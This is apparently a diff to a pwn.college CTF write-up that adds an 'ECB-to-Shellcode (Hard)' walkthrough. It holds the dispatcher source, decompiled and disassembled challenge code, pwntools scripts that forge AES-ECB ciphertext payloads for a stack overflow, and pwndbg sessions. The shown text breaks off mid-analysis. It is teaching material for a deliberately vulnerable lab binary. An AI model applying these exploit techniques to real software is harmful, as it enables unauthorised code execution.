@@ -356,7 +356,7 @@ header_block = sample_cipher[0:16]
 # Craft payload
 payload = header_block 
 
-# 5. Pass payload
+# Pass payload
 print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
 p = process('/challenge/vulnerable-overflow')
 p.send(payload)
@@ -453,7 +453,7 @@ payload += padding_blocks
 payload += return_address_block 
 payload += pkcs_padding_suffix
 
-# 5. Pass payload
+# Pass payload
 print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
 p = process('/challenge/vulnerable-overflow')
 p.send(payload)
@@ -550,7 +550,7 @@ ciphertext = cipher.encrypt(
 sys.stdout.buffer.write(ciphertext)
 ```
 
-The `/challenge/dispatch` input we provide, the dispatcher prepends the `"VERIFIED"` header along with the `length`.
+The `/challenge/dispatch` program takes input we provide, prepends the `"VERIFIED"` header along with the `length`, and gives us the relevant ciphertext.
 
 ```c title="/challenge/vulnerable-overflow" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
@@ -793,7 +793,7 @@ payload += padding_blocks
 payload += return_address_block 
 payload += pkcs_padding_suffix
 
-# 5. Pass payload
+# Pass payload
 print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
 p = process('/challenge/vulnerable-overflow')
 p.send(payload)
@@ -1057,7 +1057,7 @@ header_block = sample_cipher[0:16]
 # Craft payload
 payload = header_block 
 
-# 5. Pass payload
+# Pass payload
 print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
 p = process('/challenge/vulnerable-overflow')
 p.send(payload)
@@ -1185,7 +1185,7 @@ payload += padding_blocks
 payload += return_address_block 
 payload += pkcs_padding_suffix
 
-# 5. Pass payload
+# Pass payload
 print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
 p = process('/challenge/vulnerable-overflow')
 p.send(payload)
@@ -1246,6 +1246,669 @@ pwn.college{8sn6D2nxMYonmCE6lgbNgdP45f9.QX5UDMxEDL4ITM0EzW}
 
 ## ECB-to-Shellcode (Hard)
 
+### Binary Analysis
+
+```c title="/challenge/dispatch" showLineNumbers
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import Crypto
+import struct
+import sys
+import os
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+key = open("/challenge/.key", "rb").read()
+cipher = AES.new(key=key, mode=AES.MODE_ECB)
+
+message = sys.stdin.buffer.read1()
+assert len(message) <= 16, "Your message is too long!"
+
+plaintext = (
+    b"VERIFIED"
+    + struct.pack(b"<Q", len(message))
+    + message
+)
+
+ciphertext = cipher.encrypt(
+    pad(plaintext, cipher.block_size)
+)
+
+sys.stdout.buffer.write(ciphertext)
 ```
 
+The `/challenge/dispatch` program takes input we provide, prepends the `"VERIFIED"` header along with the `length`, and gives us the relevant ciphertext.
+
+```c title="/challenge/vulnerable-overflow" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(edata, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  challenge((unsigned int)argc, argv, envp);
+  return 0;
+}
+```
+
+Let's look at the `challenge()` function.
+
+```c title="/challenge/vulnerable-overflow" showLineNumbers
+int challenge()
+{
+  __int64 EVP_aes_128_ecb; // rax
+  __int64 EVP_aes_128_ecb_1; // rax
+  int decrypted_len; // [rsp+2Ch] [rbp-64h] BYREF
+  __int64 plaintext_header; // [rsp+30h] [rbp-60h] BYREF
+  unsigned __int64 plaintext_len; // [rsp+38h] [rbp-58h]
+  __int64 plaintext_message[4]; // [rsp+40h] [rbp-50h] BYREF
+  char key[24]; // [rsp+60h] [rbp-30h] BYREF
+  unsigned __int64 ciphertext_len; // [rsp+78h] [rbp-18h]
+  void *ciphertext; // [rsp+80h] [rbp-10h]
+  int key_file; // [rsp+8Ch] [rbp-4h]
+
+  plaintext_header = 0LL;
+  plaintext_len = 0LL;
+  memset(plaintext_message, 0, sizeof(plaintext_message));
+  key_file = open("/challenge/.key", 0);
+  if ( !key_file )
+    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 54u, "challenge");
+  if ( read(key_file, key, 16uLL) != 16 )
+    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 55u, "challenge");
+  ctx = EVP_CIPHER_CTX_new();
+  EVP_aes_128_ecb = ::EVP_aes_128_ecb();
+  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb, 0LL, key, 0LL);
+  close(key_file);
+  ciphertext = malloc(4096uLL);
+  ciphertext_len = read(0, ciphertext, 4096uLL);
+  if ( (ciphertext_len & 0xF) != 0 )
+    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 62u, "challenge");
+  if ( ciphertext_len <= 15 )
+    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 63u, "challenge");
+  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
+  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
+  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
+    __assert_fail(
+      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
+      "/challenge/vulnerable-overflow.c",
+      70u,
+      "challenge");
+  if ( plaintext_len > 16 )
+    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
+  ctx = EVP_CIPHER_CTX_new();
+  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
+  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
+  memset(key, 0, 16uLL);
+  EVP_DecryptUpdate(
+    ctx,
+    plaintext_message,
+    &decrypted_len,
+    (char *)ciphertext + 16,
+    (unsigned int)(ciphertext_len - 16));
+  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);
+  return printf("Decrypted message: %s!\n", (const char *)plaintext_message);
+}
+```
+
+This time, there is no `win()` function unlike the [ECB-to-Win (Easy)](#ecb-to-win-easy) challenge. So again we have to inject shellcode, and hijack execution to it.
+
+In order to do that, we need the following:
+- [ ] Location of the buffer
+- [ ] Location of the saved return pointer to `main()`
+
+For that, let's open the challenge in GDB.
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x0000000000401150  printf@plt
+0x0000000000401160  memset@plt
+0x0000000000401170  close@plt
+0x0000000000401180  __assert_fail@plt
+0x0000000000401190  prctl@plt
+0x00000000004011a0  setvbuf@plt
+0x00000000004011b0  read@plt
+0x00000000004011c0  malloc@plt
+0x00000000004011d0  EVP_DecryptInit_ex@plt
+0x00000000004011e0  EVP_DecryptFinal_ex@plt
+0x00000000004011f0  execve@plt
+0x0000000000401200  EVP_CIPHER_CTX_new@plt
+0x0000000000401210  personality@plt
+0x0000000000401220  memcmp@plt
+0x0000000000401230  EVP_CIPHER_CTX_set_padding@plt
+0x0000000000401240  EVP_aes_128_ecb@plt
+0x0000000000401250  EVP_DecryptUpdate@plt
+0x0000000000401260  open@plt
+0x0000000000401270  _start
+0x00000000004012a0  _dl_relocate_static_pie
+0x00000000004012b0  deregister_tm_clones
+0x00000000004012e0  register_tm_clones
+0x0000000000401320  __do_global_dtors_aux
+0x0000000000401350  frame_dummy
+0x0000000000401356  disable_aslr
+0x0000000000401447  challenge
+0x000000000040171e  main
+0x0000000000401790  __libc_csu_init
+0x0000000000401800  __libc_csu_fini
+0x0000000000401808  _fini
+```
+
+Let's disassemble `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000401447 <+0>:	endbr64
+   0x000000000040144b <+4>:	push   rbp
+   0x000000000040144c <+5>:	mov    rbp,rsp
+   0x000000000040144f <+8>:	sub    rsp,0x90
+   0x0000000000401456 <+15>:	mov    DWORD PTR [rbp-0x74],edi
+   0x0000000000401459 <+18>:	mov    QWORD PTR [rbp-0x80],rsi
+   0x000000000040145d <+22>:	mov    QWORD PTR [rbp-0x88],rdx
+   0x0000000000401464 <+29>:	mov    QWORD PTR [rbp-0x60],0x0
+   0x000000000040146c <+37>:	mov    QWORD PTR [rbp-0x58],0x0
+   0x0000000000401474 <+45>:	mov    QWORD PTR [rbp-0x50],0x0
+   0x000000000040147c <+53>:	mov    QWORD PTR [rbp-0x48],0x0
+   0x0000000000401484 <+61>:	mov    QWORD PTR [rbp-0x40],0x0
+   0x000000000040148c <+69>:	mov    QWORD PTR [rbp-0x38],0x0
+   0x0000000000401494 <+77>:	mov    esi,0x0
+   0x0000000000401499 <+82>:	lea    rdi,[rip+0xc24]        # 0x4020c4
+   0x00000000004014a0 <+89>:	mov    eax,0x0
+   0x00000000004014a5 <+94>:	call   0x401260 <open@plt>
+   0x00000000004014aa <+99>:	mov    DWORD PTR [rbp-0x4],eax
+   0x00000000004014ad <+102>:	cmp    DWORD PTR [rbp-0x4],0x0
+   0x00000000004014b1 <+106>:	jne    0x4014d2 <challenge+139>
+   0x00000000004014b3 <+108>:	lea    rcx,[rip+0xcee]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
+   0x00000000004014ba <+115>:	mov    edx,0x36
+   0x00000000004014bf <+120>:	lea    rsi,[rip+0xb42]        # 0x402008
+   0x00000000004014c6 <+127>:	lea    rdi,[rip+0xc07]        # 0x4020d4
+   0x00000000004014cd <+134>:	call   0x401180 <__assert_fail@plt>
+   0x00000000004014d2 <+139>:	lea    rcx,[rbp-0x30]
+   0x00000000004014d6 <+143>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x00000000004014d9 <+146>:	mov    edx,0x10
+   0x00000000004014de <+151>:	mov    rsi,rcx
+   0x00000000004014e1 <+154>:	mov    edi,eax
+   0x00000000004014e3 <+156>:	call   0x4011b0 <read@plt>
+   0x00000000004014e8 <+161>:	cmp    rax,0x10
+   0x00000000004014ec <+165>:	je     0x40150d <challenge+198>
+   0x00000000004014ee <+167>:	lea    rcx,[rip+0xcb3]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
+   0x00000000004014f5 <+174>:	mov    edx,0x37
+   0x00000000004014fa <+179>:	lea    rsi,[rip+0xb07]        # 0x402008
+   0x0000000000401501 <+186>:	lea    rdi,[rip+0xbd5]        # 0x4020dd
+   0x0000000000401508 <+193>:	call   0x401180 <__assert_fail@plt>
+   0x000000000040150d <+198>:	call   0x401200 <EVP_CIPHER_CTX_new@plt>
+   0x0000000000401512 <+203>:	mov    QWORD PTR [rip+0x2b0f],rax        # 0x404028 <ctx>
+   0x0000000000401519 <+210>:	call   0x401240 <EVP_aes_128_ecb@plt>
+   0x000000000040151e <+215>:	mov    rsi,rax
+   0x0000000000401521 <+218>:	mov    rax,QWORD PTR [rip+0x2b00]        # 0x404028 <ctx>
+   0x0000000000401528 <+225>:	lea    rdx,[rbp-0x30]
+   0x000000000040152c <+229>:	mov    r8d,0x0
+   0x0000000000401532 <+235>:	mov    rcx,rdx
+   0x0000000000401535 <+238>:	mov    edx,0x0
+   0x000000000040153a <+243>:	mov    rdi,rax
+   0x000000000040153d <+246>:	call   0x4011d0 <EVP_DecryptInit_ex@plt>
+   0x0000000000401542 <+251>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000401545 <+254>:	mov    edi,eax
+   0x0000000000401547 <+256>:	call   0x401170 <close@plt>
+   0x000000000040154c <+261>:	mov    edi,0x1000
+   0x0000000000401551 <+266>:	call   0x4011c0 <malloc@plt>
+   0x0000000000401556 <+271>:	mov    QWORD PTR [rbp-0x10],rax
+   0x000000000040155a <+275>:	mov    rax,QWORD PTR [rbp-0x10]
+   0x000000000040155e <+279>:	mov    edx,0x1000
+   0x0000000000401563 <+284>:	mov    rsi,rax
+   0x0000000000401566 <+287>:	mov    edi,0x0
+   0x000000000040156b <+292>:	call   0x4011b0 <read@plt>
+   0x0000000000401570 <+297>:	mov    QWORD PTR [rbp-0x18],rax
+   0x0000000000401574 <+301>:	mov    rax,QWORD PTR [rbp-0x18]
+   0x0000000000401578 <+305>:	and    eax,0xf
+   0x000000000040157b <+308>:	test   rax,rax
+   0x000000000040157e <+311>:	je     0x40159f <challenge+344>
+   0x0000000000401580 <+313>:	lea    rcx,[rip+0xc21]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
+   0x0000000000401587 <+320>:	mov    edx,0x3e
+   0x000000000040158c <+325>:	lea    rsi,[rip+0xa75]        # 0x402008
+   0x0000000000401593 <+332>:	lea    rdi,[rip+0xb61]        # 0x4020fb
+   0x000000000040159a <+339>:	call   0x401180 <__assert_fail@plt>
+   0x000000000040159f <+344>:	cmp    QWORD PTR [rbp-0x18],0xf
+   0x00000000004015a4 <+349>:	ja     0x4015c5 <challenge+382>
+   0x00000000004015a6 <+351>:	lea    rcx,[rip+0xbfb]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
+   0x00000000004015ad <+358>:	mov    edx,0x3f
+   0x00000000004015b2 <+363>:	lea    rsi,[rip+0xa4f]        # 0x402008
+   0x00000000004015b9 <+370>:	lea    rdi,[rip+0xb54]        # 0x402114
+   0x00000000004015c0 <+377>:	call   0x401180 <__assert_fail@plt>
+   0x00000000004015c5 <+382>:	mov    rax,QWORD PTR [rip+0x2a5c]        # 0x404028 <ctx>
+   0x00000000004015cc <+389>:	mov    esi,0x0
+   0x00000000004015d1 <+394>:	mov    rdi,rax
+   0x00000000004015d4 <+397>:	call   0x401230 <EVP_CIPHER_CTX_set_padding@plt>
+   0x00000000004015d9 <+402>:	mov    rax,QWORD PTR [rip+0x2a48]        # 0x404028 <ctx>
+   0x00000000004015e0 <+409>:	mov    rcx,QWORD PTR [rbp-0x10]
+   0x00000000004015e4 <+413>:	lea    rdx,[rbp-0x64]
+   0x00000000004015e8 <+417>:	lea    rsi,[rbp-0x60]
+   0x00000000004015ec <+421>:	mov    r8d,0x10
+   0x00000000004015f2 <+427>:	mov    rdi,rax
+   0x00000000004015f5 <+430>:	call   0x401250 <EVP_DecryptUpdate@plt>
+   0x00000000004015fa <+435>:	lea    rax,[rbp-0x60]
+   0x00000000004015fe <+439>:	mov    edx,0x8
+   0x0000000000401603 <+444>:	lea    rsi,[rip+0xb1f]        # 0x402129
+   0x000000000040160a <+451>:	mov    rdi,rax
+   0x000000000040160d <+454>:	call   0x401220 <memcmp@plt>
+   0x0000000000401612 <+459>:	test   eax,eax
+   0x0000000000401614 <+461>:	je     0x401635 <challenge+494>
+   0x0000000000401616 <+463>:	lea    rcx,[rip+0xb8b]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
+   0x000000000040161d <+470>:	mov    edx,0x46
+   0x0000000000401622 <+475>:	lea    rsi,[rip+0x9df]        # 0x402008
+   0x0000000000401629 <+482>:	lea    rdi,[rip+0xb08]        # 0x402138
+   0x0000000000401630 <+489>:	call   0x401180 <__assert_fail@plt>
+   0x0000000000401635 <+494>:	mov    rax,QWORD PTR [rbp-0x58]
+   0x0000000000401639 <+498>:	cmp    rax,0x10
+   0x000000000040163d <+502>:	jbe    0x40165e <challenge+535>
+   0x000000000040163f <+504>:	lea    rcx,[rip+0xb62]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
+   0x0000000000401646 <+511>:	mov    edx,0x47
+   0x000000000040164b <+516>:	lea    rsi,[rip+0x9b6]        # 0x402008
+   0x0000000000401652 <+523>:	lea    rdi,[rip+0xb0c]        # 0x402165
+   0x0000000000401659 <+530>:	call   0x401180 <__assert_fail@plt>
+   0x000000000040165e <+535>:	call   0x401200 <EVP_CIPHER_CTX_new@plt>
+   0x0000000000401663 <+540>:	mov    QWORD PTR [rip+0x29be],rax        # 0x404028 <ctx>
+   0x000000000040166a <+547>:	call   0x401240 <EVP_aes_128_ecb@plt>
+   0x000000000040166f <+552>:	mov    rsi,rax
+   0x0000000000401672 <+555>:	mov    rax,QWORD PTR [rip+0x29af]        # 0x404028 <ctx>
+   0x0000000000401679 <+562>:	lea    rdx,[rbp-0x30]
+   0x000000000040167d <+566>:	mov    r8d,0x0
+   0x0000000000401683 <+572>:	mov    rcx,rdx
+   0x0000000000401686 <+575>:	mov    edx,0x0
+   0x000000000040168b <+580>:	mov    rdi,rax
+   0x000000000040168e <+583>:	call   0x4011d0 <EVP_DecryptInit_ex@plt>
+   0x0000000000401693 <+588>:	lea    rax,[rbp-0x30]
+   0x0000000000401697 <+592>:	mov    edx,0x10
+   0x000000000040169c <+597>:	mov    esi,0x0
+   0x00000000004016a1 <+602>:	mov    rdi,rax
+   0x00000000004016a4 <+605>:	call   0x401160 <memset@plt>
+   0x00000000004016a9 <+610>:	mov    rax,QWORD PTR [rbp-0x18]
+   0x00000000004016ad <+614>:	sub    eax,0x10
+   0x00000000004016b0 <+617>:	mov    edi,eax
+   0x00000000004016b2 <+619>:	mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000004016b6 <+623>:	lea    rcx,[rax+0x10]
+   0x00000000004016ba <+627>:	mov    rax,QWORD PTR [rip+0x2967]        # 0x404028 <ctx>
+   0x00000000004016c1 <+634>:	lea    rdx,[rbp-0x64]
+   0x00000000004016c5 <+638>:	lea    rsi,[rbp-0x60]
+   0x00000000004016c9 <+642>:	add    rsi,0x10
+   0x00000000004016cd <+646>:	mov    r8d,edi
+   0x00000000004016d0 <+649>:	mov    rdi,rax
+   0x00000000004016d3 <+652>:	call   0x401250 <EVP_DecryptUpdate@plt>
+   0x00000000004016d8 <+657>:	mov    eax,DWORD PTR [rbp-0x64]
+   0x00000000004016db <+660>:	cdqe
+   0x00000000004016dd <+662>:	lea    rdx,[rbp-0x60]
+   0x00000000004016e1 <+666>:	add    rdx,0x10
+   0x00000000004016e5 <+670>:	lea    rcx,[rdx+rax*1]
+   0x00000000004016e9 <+674>:	mov    rax,QWORD PTR [rip+0x2938]        # 0x404028 <ctx>
+   0x00000000004016f0 <+681>:	lea    rdx,[rbp-0x64]
+   0x00000000004016f4 <+685>:	mov    rsi,rcx
+   0x00000000004016f7 <+688>:	mov    rdi,rax
+   0x00000000004016fa <+691>:	call   0x4011e0 <EVP_DecryptFinal_ex@plt>
+   0x00000000004016ff <+696>:	lea    rax,[rbp-0x60]
+   0x0000000000401703 <+700>:	add    rax,0x10
+   0x0000000000401707 <+704>:	mov    rsi,rax
+   0x000000000040170a <+707>:	lea    rdi,[rip+0xa6b]        # 0x40217c
+   0x0000000000401711 <+714>:	mov    eax,0x0
+   0x0000000000401716 <+719>:	call   0x401150 <printf@plt>
+   0x000000000040171b <+724>:	nop
+   0x000000000040171c <+725>:	leave
+   0x000000000040171d <+726>:	ret
+End of assembler dump.
+```
+
+The instruction at `challenge+652` calls the `EVP_DecryptUpdate@plt` with the arguments. One of those arguments is the location to which the plaintext will be read.
+We have to set a breakpoint there.
+
+The program wont unable to open the `.key` file because GDB drops permissions. Thus it will into error before ever reaching our breakpoint.
+To combat this, we can invoke the program via pwntools and attach GDB to it. For this we will have to open practice mode.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+def get_encrypted_block(payload_bytes):
+    """
+    Interacts with the AES-ECB encryption oracle (dispatcher).
+    Returns the raw ciphertext generated using the hidden system key.
+    """
+    io = process('/challenge/dispatch', level='error')
+    io.send(payload_bytes) 
+    ciphertext = io.readall()
+    io.close()
+    return ciphertext
+
+print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
+
+# Block 1 - "VERIFIED" header and length (16 bytes)
+sample_cipher = get_encrypted_block(b"A")
+header_block = sample_cipher[0:16]
+
+# Craft payload
+payload = header_block 
+
+# 5. Pass payload
+print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
+p = process('/challenge/vulnerable-overflow')
+
+# Print the PID for GDB attachment
+print(f"[+] Target PID: {p.pid}")
+pause() 
+
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
+[*] Harvesting ciphertext blocks from the ECB encryption oracle...
+[*] Dispatching assembled ciphertext (16 bytes) to target...
+[+] Starting local process '/challenge/vulnerable-overflow': pid 4495
+[+] Target PID: 4495
+[*] Paused (press any to continue)
+```
+
+Now let's attach GDB / Pwndbg to process `4495`.
+
+```
+hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ sudo pwndbg -p 4495
+pwndbg: loaded 205 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
+Attaching to process 4495
+Reading symbols from /challenge/vulnerable-overflow...
+(No debugging symbols found in /challenge/vulnerable-overflow)
+Reading symbols from /lib/x86_64-linux-gnu/libcrypto.so.1.1...
+(No debugging symbols found in /lib/x86_64-linux-gnu/libcrypto.so.1.1)
+Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
+Reading symbols from /usr/lib/debug/.build-id/57/92732f783158c66fb4f3756458ca24e46e827d.debug...
+Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
+Reading symbols from /usr/lib/debug/.build-id/9c/027be0ded30b025739f52dd6670772e0e56719.debug...
+Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
+Reading symbols from /usr/lib/debug/.build-id/97/53720502573b97dbac595b61fd72c2df18e078.debug...
+Reading symbols from /lib64/ld-linux-x86-64.so.2...
+Reading symbols from /usr/lib/debug/.build-id/db/3ae442c4308e6250049fb6159c302cf4274fa2.debug...
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x00007ffff7bfe1f2 in __GI___libc_read (fd=0, buf=0x405460, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:26
+
+warning: 26     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
+------- tip of the day (disable with set show-tips off) -------
+Use the errno (or errno <number>) command to see the name of the last or provided (libc) error
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0xfffffffffffffe00
+ RBX  0x401790 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7ffff7bfe1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x1000
+ RDI  0
+ RSI  0x405460 ◂— 0
+ R8   0x405460 ◂— 0
+ R9   0x7c
+ R10  0
+ R11  0x246
+ R12  0x401270 (_start) ◂— endbr64 
+ R13  0x7fffffffe6e0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fffffffe5c0 —▸ 0x7fffffffe5f0 ◂— 0
+ RSP  0x7fffffffe528 —▸ 0x401570 (challenge+297) ◂— mov qword ptr [rbp - 0x18], rax
+ RIP  0x7ffff7bfe1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x7ffff7bfe1f2 <read+18>          cmp    rax, -0x1000     0xfffffffffffffe00 - -0x1000     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
+   0x7ffff7bfe1f8 <read+24>        ✔ ja     read+112                    <read+112>
+    ↓
+   0x7ffff7bfe250 <read+112>         mov    rdx, qword ptr [rip + 0xddc19]     RDX, [0x7ffff7cdbe70] => 0xffffffffffffff80
+   0x7ffff7bfe257 <read+119>         neg    eax
+   0x7ffff7bfe259 <read+121>         mov    dword ptr fs:[rdx], eax            [0x7ffff7ac5b00] <= 0x200
+   0x7ffff7bfe25c <read+124>         mov    rax, 0xffffffffffffffff            RAX => 0xffffffffffffffff
+   0x7ffff7bfe263 <read+131>         ret                                <challenge+297>
+    ↓
+   0x401570       <challenge+297>    mov    qword ptr [rbp - 0x18], rax     [0x7fffffffe5a8] <= 0xffffffffffffffff
+   0x401574       <challenge+301>    mov    rax, qword ptr [rbp - 0x18]     RAX, [0x7fffffffe5a8] => 0xffffffffffffffff
+   0x401578       <challenge+305>    and    eax, 0xf                        EAX => 15 (0xffffffff & 0xf)
+   0x40157b       <challenge+308>    test   rax, rax                        0xf & 0xf     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffe528 —▸ 0x401570 (challenge+297) ◂— mov qword ptr [rbp - 0x18], rax
+01:0008│-090 0x7fffffffe530 ◂— 0
+02:0010│-088 0x7fffffffe538 —▸ 0x7fffffffe6f8 —▸ 0x7fffffffe991 ◂— 'SHELL=/run/dojo/bin/bash'
+03:0018│-080 0x7fffffffe540 —▸ 0x7fffffffe6e8 —▸ 0x7fffffffe972 ◂— '/challenge/vulnerable-overflow'
+04:0020│-078 0x7fffffffe548 ◂— 0x1f7cdd6a0
+05:0028│-070 0x7fffffffe550 ◂— 0
+06:0030│-068 0x7fffffffe558 —▸ 0x7ffff7b82525 (_IO_default_setbuf+69) ◂— cmp eax, -1
+07:0038│-060 0x7fffffffe560 ◂— 0
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x7ffff7bfe1f2 read+18
+   1         0x401570 challenge+297
+   2         0x401786 main+104
+   3   0x7ffff7b14083 __libc_start_main+243
+   4         0x40129e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Let's set our breakpoint, at `challenge+652` again and run.
+
+```
+pwndbg> break *(challenge+652)
+Breakpoint 1 at 0x4016d3
+```
+
+```
+pwndbg> c
+Continuing.
+
+```
+
+We now have to release the process from the terminal from where we ran our Python script. For that, we have to press `ENTER`.
+
+```
+hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
+[*] Harvesting ciphertext blocks from the ECB encryption oracle...
+[*] Dispatching assembled ciphertext (16 bytes) to target...
+[+] Starting local process '/challenge/vulnerable-overflow': pid 4495
+[+] Target PID: 4495
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+$  
+```
+
+Now, let's go back to GDB.
+
+```
+pwndbg> c
+Continuing.
+
+Breakpoint 1, 0x00000000004016d3 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────
+*RAX  0x406470 —▸ 0x7ffff7f91ec0 ◂— 0x10000001a2
+ RBX  0x401790 (__libc_csu_init) ◂— endbr64 
+*RCX  0x405470 ◂— 0
+*RDX  0x7fffffffe55c ◂— 0x4952455600000010
+*RDI  0x406470 —▸ 0x7ffff7f91ec0 ◂— 0x10000001a2
+*RSI  0x7fffffffe570 ◂— 0
+*R8   0
+*R9   0
+ R10  0
+*R11  0x7ffff7cdcbe0 (main_arena+96) —▸ 0x406620 ◂— 0
+ R12  0x401270 (_start) ◂— endbr64 
+ R13  0x7fffffffe6e0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fffffffe5c0 —▸ 0x7fffffffe5f0 ◂— 0
+*RSP  0x7fffffffe530 ◂— 0
+*RIP  0x4016d3 (challenge+652) ◂— call EVP_DecryptUpdate@plt
+────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x4016d3 <challenge+652>    call   EVP_DecryptUpdate@plt       <EVP_DecryptUpdate@plt>
+        ctx: 0x406470 —▸ 0x7ffff7f91ec0 ◂— 0x10000001a2
+        out: 0x7fffffffe570 ◂— 0
+        outl: 0x7fffffffe55c ◂— 0x4952455600000010
+        in: 0x405470 ◂— 0
+        inl: 0
+ 
+   0x4016d8 <challenge+657>    mov    eax, dword ptr [rbp - 0x64]
+   0x4016db <challenge+660>    cdqe   
+   0x4016dd <challenge+662>    lea    rdx, [rbp - 0x60]
+   0x4016e1 <challenge+666>    add    rdx, 0x10
+   0x4016e5 <challenge+670>    lea    rcx, [rdx + rax]
+   0x4016e9 <challenge+674>    mov    rax, qword ptr [rip + 0x2938]     RAX, [ctx]
+   0x4016f0 <challenge+681>    lea    rdx, [rbp - 0x64]
+   0x4016f4 <challenge+685>    mov    rsi, rcx
+   0x4016f7 <challenge+688>    mov    rdi, rax
+   0x4016fa <challenge+691>    call   EVP_DecryptFinal_ex@plt     <EVP_DecryptFinal_ex@plt>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp   0x7fffffffe530 ◂— 0
+01:0008│-088   0x7fffffffe538 —▸ 0x7fffffffe6f8 —▸ 0x7fffffffe991 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-080   0x7fffffffe540 —▸ 0x7fffffffe6e8 —▸ 0x7fffffffe972 ◂— '/challenge/vulnerable-overflow'
+03:0018│-078   0x7fffffffe548 ◂— 0x1f7cdd6a0
+04:0020│-070   0x7fffffffe550 ◂— 0
+05:0028│ rdx-4 0x7fffffffe558 ◂— 0x10f7b82525
+06:0030│-060   0x7fffffffe560 ◂— 0x4445494649524556 ('VERIFIED')
+07:0038│-058   0x7fffffffe568 ◂— 1
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x4016d3 challenge+652
+   1         0x401786 main+104
+   2   0x7ffff7b14083 __libc_start_main+243
+   3         0x40129e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Let's also get the saved return address.
+
+```
+pwndbg> info frame
